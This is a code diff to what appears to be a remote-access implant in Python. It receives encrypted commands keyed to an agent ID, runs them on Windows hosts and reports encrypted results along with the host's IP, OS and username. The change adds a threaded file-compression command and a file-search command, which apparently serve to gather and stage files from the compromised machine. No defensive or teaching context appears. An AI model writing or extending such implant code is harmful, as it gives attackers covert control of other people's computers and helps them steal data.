@@ -51,12 +51,17 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.get_scheduled_task_info import get_scheduled_task_info
     from utils.winapi.cat import cat
     from utils.winapi.start_scheduled_task import start_scheduled_task
-    from utils.winapi.compress import compress_file
+    from utils.winapi.compress import start_compression_thread
+    from utils.winapi.search_files import search as search_files
 
 logging.getLogger("httpx").setLevel(logging.WARNING)
 logging.getLogger("supabase").setLevel(logging.WARNING)
 logging.basicConfig(level=logging.WARNING)
 smb_pipe_conn = None
+
+def update_command_status_wrapper(command_id, status, output, agent_id, ip, os_info, username, encryption_key):
+    encrypted_output = encrypt_response(output, encryption_key)
+    update_command_status(command_id, status, encrypted_output, agent_id, ip, os_info, username)
 
 def decrypt_command(encrypted_command, key):
     try:
@@ -276,13 +281,23 @@ def execute_commands(agent_id):
             elif os.name == 'nt' and command_text.lower().startswith('compress'):
                 try:
                     file_path = command_text.split(' ', 1)[1]
-                    result = compress_file(file_path)
-                    status = 'Completed'
-                    output = f"File compressed successfully: {result}"
+                    compression_thread = start_compression_thread(
+                        file_path, 
+                        command_id, 
+                        update_command_status_wrapper, 
+                        agent_id, 
+                        ip, 
+                        os_info, 
+                        username, 
+                        encryption_key
+                    )
+                    status = 'Running'
+                    output = f"Compression process started in the background for file: {file_path}"
+                    update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
+                    update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
 
             elif os.name == 'nt' and command_text.lower().startswith('rm'):
                 try:
@@ -445,6 +460,16 @@ def execute_commands(agent_id):
                         raise ValueError("Invalid cp command format. Use 'cp <source> <destination>'.")
                     src, dst = parts[1], parts[2]
                     result = cp(src, dst)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('search'):
+                try:
+                    result = search_files()
                     status = 'Completed'
                     output = result
                 except Exception as e:
